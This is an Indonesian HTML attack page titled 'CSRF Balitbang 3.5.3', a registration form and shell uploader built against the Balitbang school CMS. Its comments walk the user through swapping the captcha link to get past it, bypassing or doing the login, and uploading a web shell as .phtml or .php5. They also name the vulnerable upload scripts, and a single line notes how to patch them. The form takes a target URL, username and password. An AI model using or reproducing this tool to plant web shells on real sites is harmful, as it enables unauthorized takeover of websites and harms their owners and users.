
<html>
<!---
// script ini dibuat berdasarkan iseng saja... :)
// by. kitasemua
// --------------------------
// Simpan script ini dengan nama: test.php
// - Jika captcha tidak muncul, buka inspect element, arahin cursor ke captcha, ganti link captcha "/functions/captcha/captcha.php" -> "/functions/spam.php"
// - Jika bypass login gagal, silahkan login manual, kemudian lanjut upload shellnya
// - Format shell: *.phtml, *.php5
// --------------------------
// Bugs terletak pada /functons/simmateri.php dan /functions/simmateriguru.php
// Cara menutup bugs ini: gunakan fungsi batasan ekstensi file seperti di /functions/simlapguru.php
// --------------------------
// Tunggu Tutorial selanjutnya "Bypass $_SESSION untuk Lokomedia, Balitbang, F0rmulaCMS".
// --------------------------
-->
<head>
<title>[+] CSRF Balitbang 3.5.3 [+]</title>
<link rel="shortcut icon" href="https://c.top4top.io/p_1600qngpv1.png" type="image/x-icon">
<link rel="icon" href="https://c.top4top.io/p_1600qngpv1.png" type="image/x-icon">
</head>
<style type="text/css">
input[type=text],input[type=code],input[type=password]{
	border:1px solid #c0c0c0;
	height:24px;
	padding:5px;
}
</style>
<body>
CSRF Regstration Form + Shell Uploader (Balitbang 3.5.3) - KCT<hr><form method="post" action="" enctype="multipart/form-data">
<table id=tablebaru cellspacing='1' cellpadding='3'>
	<tr>
		<td>target</td>
		<td>:</td>
		<td><input type="text" name="tar" size="61" placeholder='http://'/></td>
	</tr>
	<tr>
		<td>username</td>
		<td>:</td>
		<td><input type="text" name="n" size="61"/></td>
	</tr>
	<tr>
		<td>password</td>
		<td>:</td>
		<td><input type="text" name="p" size="61"/></td>
	</tr>
	<tr>
		<td></td>
		<td></td>
		<td><input type="submit" name="next" value="NEXT &raquo;"/></td>
	</tr>
</table>
</form>
<hr>
</body>
</html>
